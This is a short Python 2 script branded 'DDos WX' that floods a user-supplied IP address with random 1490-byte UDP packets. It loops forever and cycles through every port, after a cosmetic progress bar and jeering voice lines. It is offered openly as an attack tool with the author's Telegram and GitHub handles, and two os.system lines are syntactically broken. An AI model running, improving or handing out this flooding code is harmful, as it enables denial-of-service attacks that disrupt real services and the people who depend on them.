import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year
##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############
os.system("clear")
os.system("figlet DDos WX")
print
print "macker   : WX"
print "telegram : https://t.me/Sad_Wx_virus"
print "github   : https://github.com/WIROUX"
print
ip = raw_input("IP Target : ")
port = input("Port        : ")

os.system("clear")
os.system("figlet DDos WX")
os.system("figlet Attack WX")
print "[--------------------] 0% "
time.sleep(4)
print "[>>>>>---------------] 25%"
time.sleep(4)
print "[>>>>>>>>>>----------] 50%"
time.sleep(4)
print "[>>>>>>>>>>>>>>>-----] 75%"
time.sleep(4)
print "[>>>>>>>>>>>>>>>>>>>>] 100%"
print "GO GO GO"
os.system(espeak "berim sickesh konim")
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     os.system(espeak "ridi")
     if port == 65534:
       port = 1
